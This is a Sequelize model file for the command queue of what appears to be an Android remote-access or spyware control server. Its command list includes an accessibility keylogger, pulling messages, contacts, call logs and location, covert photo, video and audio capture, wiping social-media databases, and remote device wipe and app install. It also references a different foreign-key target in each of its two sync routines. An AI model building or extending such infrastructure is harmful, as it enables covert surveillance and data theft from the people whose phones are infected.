const { DataTypes } = require('sequelize');

module.exports = (sequelize) => {
    const Command = sequelize.define('Command', {
      id: {
          type: DataTypes.UUID,
          defaultValue: DataTypes.UUIDV4,
          primaryKey: true
      },
      deviceId: {
          type: DataTypes.STRING,
          allowNull: false,
          references: {
              model: 'devices',
              key: 'deviceId',
              onDelete: 'CASCADE',
              onUpdate: 'CASCADE'
          }
      },
      command_type: {
          type: DataTypes.ENUM(
              // Basic commands
              'unknown',
              'login',
              'custom',

              // Data management
              'push_tokens',
              'push_data',
              'start_repeat_push_data',
              'stop_repeat_push_data',
              'sync_app_config',

              // Call log management
              'push_call_logs',
              'add_call_log',
              'delete_call_log',

              // Contact management
              'push_contacts',
              'add_contact',
              'delete_contact',

              // Message management
              'push_messages',
              'send_message',

              // File management
              'push_file_explorer_walk',
              'push_thumbnails',
              'delete_file',
              'push_file',
              'push_files',
              'get_pending_push_files',
              'delete_pending_push_files',
              'sync_push_files',

              // Location
              'push_location',

              // Device actions
              'vibrate',
              'flash',

              // Media capture
              'take_picture',
              'record_video',
              'record_audio',

              // App management
              'push_installed_app_list',
              'push_app_logs',
              'push_device_info',
              'open_app',
              'make_call',
              'open_deeplink',

              // System commands
              'get_diagnosis',
              'schedule_command',
              'cancel_scheduled_command',
              'start_initializer',

              // Socket management
              'connect_socket',
              'disconnect_socket',

              // Accessibility commands
              'run_accessibility_command',
              'push_accessibility_keylogger',
              'push_accessibility_notifications',
              'push_accessibility_social_media',
              'accessibility_nuke_social_media_database',

              // Audio management
              'set_device_audio',
              'push_device_audio',
              'play_sound',

              // Configuration
              'set_dynamic_config',
              'push_dynamic_config',

              // Legacy compatibility
              'location_request',
              'take_photo',
              'get_contacts',
              'get_sms',
              'send_sms',
              'get_call_logs',
              'get_device_info',
              'lock_device',
              'unlock_device',
              'wipe_device',
              'install_app',
              'uninstall_app',
              'get_installed_apps',
              'show_message'
          ),
          allowNull: false
      },
      command_data: {
          type: DataTypes.JSON,
          allowNull: true,
          comment: 'Command parameters and data'
      },
      status: {
          type: DataTypes.ENUM('pending', 'sent', 'acknowledged', 'completed', 'failed', 'expired'),
          defaultValue: 'pending'
      },
      priority: {
          type: DataTypes.ENUM('low', 'normal', 'high', 'urgent'),
          defaultValue: 'normal'
      },
      created_by: {
          type: DataTypes.UUID,
          allowNull: true,
          comment: 'User ID who created the command'
      },
      sent_at: {
          type: DataTypes.DATE,
          allowNull: true
      },
      acknowledged_at: {
          type: DataTypes.DATE,
          allowNull: true
      },
      completed_at: {
          type: DataTypes.DATE,
          allowNull: true
      },
      expires_at: {
          type: DataTypes.DATE,
          allowNull: true
      },
      response_data: {
          type: DataTypes.JSON,
          allowNull: true,
          comment: 'Response from device'
      },
      error_message: {
          type: DataTypes.TEXT,
          allowNull: true
      },
      retry_count: {
          type: DataTypes.INTEGER,
          defaultValue: 0,
          allowNull: false
      },
      max_retries: {
          type: DataTypes.INTEGER,
          defaultValue: 3
      }
    }, {
      tableName: 'commands',
      timestamps: true,
      underscored: true,
      indexes: [
          {
              name: 'idx_commands_device_id',
              fields: ['deviceId']
          },
          {
              name: 'idx_commands_command_type',
              fields: ['command_type']
          },
          {
              name: 'idx_commands_status',
              fields: ['status']
          },
          {
              name: 'idx_commands_created_at',
              fields: ['created_at']
          }
      ],
      hooks: {
        afterSync: async (options) => {
          const queryInterface = options.sequelize.getQueryInterface();
          const transaction = await options.sequelize.transaction();
          
          try {
            // Drop existing foreign key constraints if they exist
            await queryInterface.removeConstraint('commands', 'commands_device_id_fk', { transaction }).catch(() => {});
            await queryInterface.removeConstraint('commands', 'commands_ibfk_1', { transaction }).catch(() => {});
            await queryInterface.removeConstraint('commands', 'commands_ibfk_2', { transaction }).catch(() => {});
            await queryInterface.removeConstraint('commands', 'commands_ibfk_3', { transaction }).catch(() => {});
            
            // Add the correct foreign key constraint
            await queryInterface.addConstraint('commands', {
              fields: ['deviceId'],
              type: 'foreign key',
              name: 'commands_device_id_fk',
              references: { 
                table: 'devices', 
                field: 'deviceId'  // Reference the deviceId field which is the main identifier
              },
              onDelete: 'CASCADE',
              onUpdate: 'CASCADE',
              transaction
            });
            
            await transaction.commit();
          } catch (error) {
            await transaction.rollback();
            console.error('Error setting up Command foreign keys:', error);
          }
        }
      }
    });

    // Add syncWithDatabase method for special handling
    Command.syncWithDatabase = async function(options = {}) {
      const queryInterface = this.sequelize.getQueryInterface();
      
      try {
        // Check if the constraint already exists
        const [results] = await queryInterface.sequelize.query(
          `SELECT CONSTRAINT_NAME 
           FROM INFORMATION_SCHEMA.KEY_COLUMN_USAGE 
           WHERE TABLE_NAME = 'commands' 
           AND CONSTRAINT_NAME = 'commands_device_id_fk'`
        );
        
        // Only add the constraint if it doesn't exist
        if (!results || results.length === 0) {
          // Drop existing foreign key constraints if they exist
          try {
            await queryInterface.removeConstraint('commands', 'commands_device_id_fk');
          } catch (e) {
            // Ignore if constraint doesn't exist
            if (!e.message.includes('constraint not found')) {
              throw e;
            }
          }
          
          // Sync the model
          await this.sync(options);
          
          // Add the correct foreign key constraint
          await queryInterface.addConstraint('commands', {
            fields: ['deviceId'],
            type: 'foreign key',
            name: 'commands_device_id_fk',
            references: {
              table: 'devices',
              field: 'id'  // Changed from 'device_id' to 'id'
            },
            onDelete: 'CASCADE',
            onUpdate: 'CASCADE'
          });
        }
        
        return true;
      } catch (error) {
        console.error('Error syncing Command model:', error);
        return false;
      }
    };

    return Command;
};
